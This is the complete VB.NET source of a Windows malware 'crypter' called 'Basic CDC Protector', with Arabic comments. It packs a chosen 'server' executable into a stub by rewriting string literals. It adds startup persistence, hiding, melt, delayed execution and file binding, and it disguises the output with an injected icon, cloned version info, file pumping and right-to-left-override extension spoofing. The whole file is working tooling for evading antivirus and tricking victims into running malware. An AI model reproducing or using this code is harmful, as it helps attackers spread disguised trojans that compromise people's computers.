Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.IO.Compression
Imports System.CodeDom.Compiler
Imports System.ComponentModel
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Security.Cryptography
Imports System.Text.RegularExpressions
Imports System.Text

Public Class Form1
    Dim TheEOF As String
    Dim EOF_Data As String = String.Empty
    Dim c, oo, dd As New OpenFileDialog
    Dim FileDdD As New OpenFileDialog
    Dim FileDD As New SaveFileDialog
    Dim dialog As New SaveFileDialog

#Region "Functions & Subs"
#Region " Global Variables "
    Dim Point As New System.Drawing.Point()
    Dim X, Y As Integer
#End Region
#Region " GUI "
    Private Sub Main_MouseMove(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles MyBase.MouseMove
        If e.Button = MouseButtons.Left Then
            Point = Control.MousePosition
            Point.X = Point.X - (X)
            Point.Y = Point.Y - (Y)
            Me.Location = Point
        End If

    End Sub
    Private Sub Main_MouseDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles MyBase.MouseDown
        X = Control.MousePosition.X - Me.Location.X
        Y = Control.MousePosition.Y - Me.Location.Y
    End Sub

#End Region
    'Eof read and write
    Public Function ReadEOFData(ByRef FilePath As String) As String
        On Error GoTo errorhandle
        Dim sEOFBuf, sFileBuf, sChar As String
        Dim lPos2, lFF, lPos, lCount As Integer
        If Dir(FilePath) = "" Then GoTo errorhandle
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        sFileBuf = Space(LOF(lFF))
        FileGet(lFF, sFileBuf)
        FileClose(lFF)
        lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
        sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
        ReadEOFData = StrReverse(sEOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
errorhandle:
        ReadEOFData = String.Empty
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim sBuf As String
        Dim i As Short
        For i = 1 To lNum
            sBuf = sBuf & Chr(0)
        Next
        GetNullBytes = sBuf
    End Function
    Sub WriteEOFData(ByRef FilePath As String, ByRef EOFData As String)
        Dim sFileBuf As String
        Dim lFF As Integer
        On Error Resume Next
        If Dir(FilePath) = "" Then Exit Sub
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        sFileBuf = Space(LOF(lFF))
        FileGet(lFF, sFileBuf)
        FileClose(lFF)
        Kill(FilePath)
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        FilePut(lFF, sFileBuf & EOFData)
        FileClose(lFF)
    End Sub
    'random Letters
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "你会讲英语中文吗这个字那个词在英语里是什么意思我想要个不允许吸烟的房间不劳动者不得食האםאתהדובראנגליתעבריתאנירוצהחדרללאעישוןבמהאתהעוסקלמחייתabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()1234567890ךابتثجحخدذرزسشصضطظعغفقكلمنهوي".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    'random numbers
    Public Function Randomisi2(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "123456789".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    'assemblley
    Sub app()
        On Error Resume Next
        If File.Exists(Application.StartupPath & "\res.exe") Then
            File.Delete(Application.StartupPath & "\res.exe")
        End If
        If File.Exists(Application.StartupPath & "\System.res") Then
            File.Delete(Application.StartupPath & "\System.res")
        End If
        System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
        Dim src As String = My.Resources.String1
        If File.Exists(Application.StartupPath & "\System.exe") Then
            File.Delete(Application.StartupPath & "\System.exe")
        End If
        Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
        Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
        Dim cResults As CompilerResults
        Dim Settings As New CompilerParameters()
        With Settings
            .GenerateExecutable = True
            .OutputAssembly = Application.StartupPath & "\System.exe"
            .CompilerOptions = "/target:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .MainClass = "X"
        End With
        src = src.Replace("1", TextBox20.Text)
        src = src.Replace("2", TextBox21.Text)
        src = src.Replace("3", TextBox22.Text)
        src = src.Replace("4", TextBox23.Text)
        src = src.Replace("5", TextBox24.Text)
        src = src.Replace("6", TextBox25.Text)
        src = src.Replace("*version*", NumericUpDown20.Value.ToString & "." & NumericUpDown21.Value.ToString & "." & NumericUpDown22.Value.ToString & "." & NumericUpDown23.Value.ToString)
        src = src.Replace("*fversion*", NumericUpDown24.Value.ToString & "." & NumericUpDown25.Value.ToString & "." & NumericUpDown26.Value.ToString & "." & NumericUpDown27.Value.ToString)
        cResults = Compiler.CompileAssemblyFromSource(Settings, src)
        If cResults.Errors.Count > 0 Then
            For Each CompilerError In cResults.Errors
                MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next

            File.Delete(Application.StartupPath & "\res.exe")
            File.Delete(Application.StartupPath & "\res.log")
            File.Delete(Application.StartupPath & "\res.ini")
            File.Delete(Application.StartupPath & "\System.exe")
            File.Delete(Application.StartupPath & "\System.res")
            File.Delete(Application.StartupPath & "\System.exe")
            File.Delete(Application.StartupPath & "\System.res")
            File.Delete(Application.StartupPath & "\res.exe")
            File.Delete(Application.StartupPath & "\res.log")
            File.Delete(Application.StartupPath & "\res.ini")
            File.Delete(Application.StartupPath & "\res.txt")

            MessageBox.Show("An error occurred. The assembly was not changed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        Dim otherfile As String = Application.StartupPath & "\System.exe"
        Dim resfile As String = Application.StartupPath & "\System.res"

        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,")
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & FileDD.FileName & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,")
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & FileDD.FileName & "," & FileDD.FileName & "," & resfile & ",VERSIONINFO,1,")

        File.Delete(Application.StartupPath & "\System.exe")
        File.Delete(Application.StartupPath & "\System.res")
        File.Delete(Application.StartupPath & "\res.exe")
        File.Delete(Application.StartupPath & "\res.log")
        File.Delete(Application.StartupPath & "\res.ini")
        File.Delete(Application.StartupPath & "\res.txt")

    End Sub
    'deleteresource
    <DllImport("kernel32", EntryPoint:="BeginUpdateResourceA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function BeginUpdateResource(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef pFileName As String, ByVal bDeleteExistingResources As Integer) As Integer
    End Function
    <DllImport("kernel32", EntryPoint:="EndUpdateResourceA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Shared Function EndUpdateResource(ByVal hUpdate As Integer, ByVal fDiscard As Integer) As Integer
    End Function
    Public Sub FlushIt(ByRef File As String)
        Form1.EndUpdateResource(Form1.BeginUpdateResource(File, 1), 0)
    End Sub
    'Clone
    Public Function GetPath() As String
        Return Path.GetTempPath
    End Function
    Private Sub clone(ByVal SourceFile As String, ByVal DestinationFiles As String)
        My.Computer.FileSystem.WriteAllBytes((Me.GetPath & "res.exe"), My.Resources.Res, False)
        Interaction.Shell(String.Concat(New String() {Me.GetPath, "\\res.exe -extract ", SourceFile, ",", Me.GetPath, "\\info.res,VERSIONINFO,,"}), AppWinStyle.MinimizedFocus, False, -1)
        Interaction.Shell(String.Concat(New String() {Me.GetPath, "\\res.exe -delete ", DestinationFiles, ",", Me.GetPath, "\\res.exe,VERSIONINFO,,"}), AppWinStyle.MinimizedFocus, False, -1)
        Interaction.Shell(String.Concat(New String() {Me.GetPath, "\\res.exe -addoverwrite ", DestinationFiles, ",", DestinationFiles, ",", Me.GetPath, "\\info.res,VERSIONINFO,1,"}), AppWinStyle.MinimizedFocus, False, -1)
    End Sub
    '''''compress & convert
    Public Shared Function Compress(ByVal bytData() As Byte) As Byte()
        Using oMS As New MemoryStream()
            'GZip object that compress the file 
            Using oGZipStream As New GZipStream(oMS, CompressionMode.Compress)
                'Write to the Stream object from the buffer
                oGZipStream.Write(bytData, 0, bytData.Length)
                oGZipStream.Close()
                ReDim bytData(oMS.ToArray.Length - 1)
                bytData = oMS.ToArray
            End Using
            oMS.Close()
        End Using
        Return bytData
    End Function
    ''تحويل من بايت لسترنج 
    Function BSs(ByVal bb As Byte()) As String
        Return System.Text.Encoding.Default.GetString(bb)
    End Function
#End Region
    ''بدء التشفير
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        If TextBox1.Text = "" Or TextBox1.Text = "[ Server To Protect Path ]" Then
            Interaction.MsgBox("Choose File To Protect.!", MsgBoxStyle.Critical, "Basic CDC Protector")
            Else
                Timer4.Start()
            End If
            ProgressBar1.Value = 0
    End Sub
    ''اختيار ملف السرفر
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim FileDD As New OpenFileDialog
        With FileDD
            .Filter = "Application (*.exe) |*.exe"
            .Title = "Select Server To Cryped | "
            If .ShowDialog() = Windows.Forms.DialogResult.Cancel Then
                Exit Sub
            End If
        End With
        TextBox1.Text = FileDD.FileName
        ''فحص لدعم الملف لخاصيه oef
        TheEOF = ReadEOFData(FileDD.FileName)
        If TheEOF = Nothing Then
            Label1.Text = "EOF(Not Recommended)"
            Label1.ForeColor = Color.Green
        Else
            Label1.Text = "EOF(Recommended)"
            Label1.ForeColor = Color.Red
        End If
    End Sub
    ''اختيار الملف المدمج كل الصيغ
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Dim oo As New OpenFileDialog With {.Filter = "Add File (Any File [*.*] | *.*", .ShowHelp = True}
        If oo.ShowDialog = vbOK Then
            TextBox6.Text = oo.FileName
        End If
    End Sub
    ''اختيار الايقونه
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim o As New OpenFileDialog With {.Filter = "Icon Files (.ico)|*.ico", .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            icotxt.Text = o.FileName
        End If
        PictureBox2.ImageLocation = c.FileName
        c.FileName = icotxt.Text
    End Sub
    ''بدء توليد سترنجات وارقام لمعلومات الملف
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        If Button6.Text = "Gen" Or Button6.Text = "Start" Then
            Timer3.Start()
            Button6.Text = "Stop"
        Else
            Timer3.Stop()
            Timer3.Stop()
            Button6.Text = "Start"
        End If
    End Sub
    ''''توليد سترنجات وارقام لمعلومات الملف
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        On Error Resume Next
        TextBox20.Text = Randomisi(10)
        TextBox21.Text = Randomisi(10)
        TextBox22.Text = Randomisi(10)
        TextBox23.Text = Randomisi(10)
        TextBox24.Text = Randomisi(10)
        TextBox25.Text = Randomisi(10)
        NumericUpDown20.Value = Randomisi2(2)
        NumericUpDown21.Value = Randomisi2(2)
        NumericUpDown22.Value = Randomisi2(2)
        NumericUpDown23.Value = Randomisi2(2)
        NumericUpDown24.Value = Randomisi2(2)
        NumericUpDown25.Value = Randomisi2(2)
        NumericUpDown26.Value = Randomisi2(2)
        NumericUpDown27.Value = Randomisi2(2)
    End Sub
    ''اختيار ملف لسحب معلوماته
    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        With dd
            .Filter = "Executable(*.exe) | *.exe"
            .Title = "Choose Your File..."
            .ShowDialog()
            TextBox5.Text = dd.FileName
        End With
    End Sub
    ''كل ما يخص التشفير وكتابه الخصائص
    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Timer4.Stop()
        Try
            If Not File.Exists((Application.StartupPath & "\stub.exe")) Then
                Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Else
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If CheckBox1.Checked = True Then
                                                EOF_Data = ReadEOFData(TextBox1.Text)
                                            End If
                                            ProgressBar1.Value = 0
                                            ''تشفير السرفر
                                            Dim bv As Byte() = Compress(System.IO.File.ReadAllBytes(TextBox1.Text)) 'compress
                                            Dim sss As String = Convert.ToBase64String(bv)

                                            If (str = "[serverstring]") Then
                                                current.Operand = sss
                                            End If
                                            ProgressBar1.Value = 10
                                            ''تفعيل او الغاءتفعيل نسخ السرفر
                                            If copyser.Checked = True Then
                                                If (str = "[Falsecopyserv]") Then
                                                    current.Operand = copyser.Checked.ToString
                                                End If
                                                If (str = "[%temp%]") Then
                                                    current.Operand = servpath.Text.ToString
                                                End If

                                                If (str = "[copFolder]") Then
                                                    current.Operand = Randomisi(10)
                                                End If
                                                If (str = "[copynam]") Then
                                                    current.Operand = TextBox2.Text
                                                End If
                                            End If
                                            ProgressBar1.Value = 20
                                            ''تفعيل او الغاءتفعيل تثبيت السرفر
                                            If CheckBox7.Checked = True Then
                                                If (str = "[startupfalse]") Then
                                                    current.Operand = CheckBox7.Checked.ToString
                                                End If
                                                If (str = "[serregname]") Then
                                                    current.Operand = TextBox7.Text
                                                End If
                                            End If
                                            ''تفعيل او الغاء تفعيل اضافه ناخير لعمل السرفر
                                            If CheckBox11.Checked = True Then
                                                If (str = "[falsesrvsleep]") Then
                                                    current.Operand = CheckBox11.Checked.ToString
                                                End If
                                                If (str = "[srvsleeptime]") Then
                                                    current.Operand = TextBox4.Text
                                                End If
                                            End If
                                            ProgressBar1.Value = 30
                                            ''تفعيل او الغاء تفعيل دمج ملف
                                            If CheckBox1.Checked = True Then
                                                If (str = "[falsebind]") Then
                                                    current.Operand = CheckBox1.Checked.ToString
                                                End If
                                                If (str = "[bindedstring]") Then
                                                    Dim aaaaa As String = BSs(Compress(System.IO.File.ReadAllBytes(TextBox6.Text)))
                                                    current.Operand = aaaaa
                                                End If
                                                If (str = "[bindtemp]") Then
                                                    current.Operand = bindpath.Text.ToString
                                                End If
                                                If (str = "[bindname]") Then
                                                    current.Operand = TextBox8.Text
                                                End If
                                            End If
                                            ''تفعيل او الغاء تفعيل اضافه ناخير لتشغيل الملف المدمج
                                            If CheckBox14.Checked = True Then
                                                If (str = "[falsebndleep]") Then
                                                    current.Operand = CheckBox14.Checked.ToString
                                                End If
                                                If (str = "[bndsleeptime]") Then
                                                    current.Operand = TextBox3.Text
                                                End If
                                            End If
                                            ProgressBar1.Value = 40
                                            ''تفعيل او الغاءتفعيل حظر المواقع
                                            If CheckBox5.Checked = True Then
                                                If (str = "[falseblock]") Then
                                                    current.Operand = CheckBox5.Checked.ToString
                                                End If
                                            End If
                                            ProgressBar1.Value = 50
                                            ''تفعيل او الغاءتفعيل اخفاء الاذابه
                                            If CheckBox3.Checked = True Then
                                                If (str = "[falsemelt]") Then
                                                    current.Operand = CheckBox3.Checked.ToString
                                                End If
                                            End If
                                            ProgressBar1.Value = 60
                                            ''تفعيل او الغاءتفعيل اخفاء الملف
                                            If CheckBox2.Checked = True Then
                                                If (str = "[falsehide]") Then
                                                    current.Operand = CheckBox2.Checked.ToString
                                                End If
                                            End If
                                            ProgressBar1.Value = 70
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next
                With dialog
                    .Filter = "EXE Applications (*.exe)|*.exe"
                    .FileName = "Server.exe"
                    .ShowHelp = True
                End With
                If dialog.ShowDialog = vbOK Then
                    definition.Write(dialog.FileName)
                    ProgressBar1.Value = 75
                    ''كتابه oef للسرفرات التى تدعمها
                    If CheckBox1.Checked = True Then
                        WriteEOFData(FileDD.FileName, EOF_Data)
                    End If
                    ProgressBar1.Value = 80
                    ''تغيير الايقونه
                    If CheckBox4.Checked = True Then
                        If icotxt.Text = "" Or icotxt.Text = "[ Icon To Change Path ]" Then
                            Interaction.MsgBox("Choose Icon To Change  Or Unckeck Enable Icon Changer .!", MsgBoxStyle.Critical, "Basic CDC Protector")
                        Else
                            IconInjector.InjectIcon(FileDD.FileName, c.FileName)
                        End If
                    End If
                    ProgressBar1.Value = 85
                    ''
                    If CheckBox9.Checked = True Then
                        app()
                    End If
                    ProgressBar1.Value = 90
                    ''زياده البايتات
                    If CheckBox10.Checked = True Then
                        Dim filesize As Double = Val(NumericUpDown1.Value)
                        If RadioButton1.Checked Then
                            filesize = filesize * 1024
                        End If
                        If RadioButton2.Checked Then
                            filesize = filesize * 1048576
                        End If
                        If RadioButton3.Checked Then
                            filesize = filesize * 1073741824
                        End If
                        If RadioButton4.Checked Then
                            filesize = filesize * 1099511627776
                        End If
                        Dim filetopump = IO.File.OpenWrite(FileDD.FileName)
                        Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
                        While size < filesize
                            filetopump.WriteByte(0)
                            size += 1
                        End While
                        filetopump.Close()
                    End If
                    ProgressBar1.Value = 95
                    ''نغيير الصيغه
                    If CheckBox8.Checked = True Then
                        Dim str3 As String = Strings.StrReverse(Me.spoofbox.Text)
                        Dim str5 As String = FileDD.FileName.Replace(".exe", "")
                        Dim newPath As String = (str5 & ChrW(8238) & str3 & ".exe")
                        FileSystem.Rename(FileDD.FileName, newPath)

                    End If
                    ''حذف الريسورس من السرفر
                    If CheckBox6.Checked = True Then
                        Me.FlushIt(FileDD.FileName)
                    End If
                    ''سحب معلومات ملف واضافتها للسرفر
                    If CheckBox12.Checked = True Then

                        If TextBox5.Text = "" Or TextBox5.Text = "[ File To Clone Info Path ]" Then

                            Interaction.MsgBox("Choose File To Clone Info  Or Unckeck Enable Cloner .!", MsgBoxStyle.Critical, "Basic CDC Protector")
                        Else
                            clone(dd.FileName, FileDD.FileName)
                        End If
                    End If
                    Threading.Thread.Sleep(1000)
                    ProgressBar1.Value = 100
                    ''حذف الملفات الخاصه بتغيير معلوات الاسمبلى
                    File.Delete(Application.StartupPath & "\System.exe")
                    File.Delete(Application.StartupPath & "\System.res")
                    File.Delete(Application.StartupPath & "\res.exe")
                    File.Delete(Application.StartupPath & "\res.log")
                    File.Delete(Application.StartupPath & "\res.ini")
                    File.Delete(Application.StartupPath & "\res.txt")
                    File.Delete(Application.StartupPath & "\System.exe")
                    File.Delete(Application.StartupPath & "\System.res")
                    File.Delete(Application.StartupPath & "\res.exe")
                    File.Delete(Application.StartupPath & "\res.log")
                    File.Delete(Application.StartupPath & "\res.ini")
                    File.Delete(Application.StartupPath & "\res.txt")
                    MsgBox("Your Server Has been Crypted as :" & vbNewLine & dialog.FileName, vbInformation, "DONE!")
                End If
            End If
        Catch : End Try
        ProgressBar1.Value = 0
    End Sub
End Class
''كلاس تغيير الايقونه
Public Class IconInjector
    <SuppressUnmanagedCodeSecurity()> _
    Private Class NativeMethods
        <DllImport("kernel32")> _
        Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function
        <DllImport("kernel32")> _
        Public Shared Function UpdateResource( _
            ByVal hUpdate As IntPtr, _
            ByVal type As IntPtr, _
            ByVal name As IntPtr, _
            ByVal language As Short, _
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
        <DllImport("kernel32")> _
        Public Shared Function EndUpdateResource( _
            ByVal hUpdate As IntPtr, _
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIR
        Public Reserved As UShort
        Public Type As UShort
        Public Count As UShort
    End Structure
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ImageOffset As Integer
    End Structure
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure
    <StructLayout(LayoutKind.Sequential, Pack:=2)> _
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure
    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub
    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = iconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i As Integer = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub
    Private Class IconFile
        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte
        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property
        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property
        Private Sub New()
        End Sub
        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            Dim offset = Marshal.SizeOf(instance.iconDir)
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i As Integer = 0 To instance.iconDir.Count - 1
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function
        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i As Integer = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function
    End Class
End Class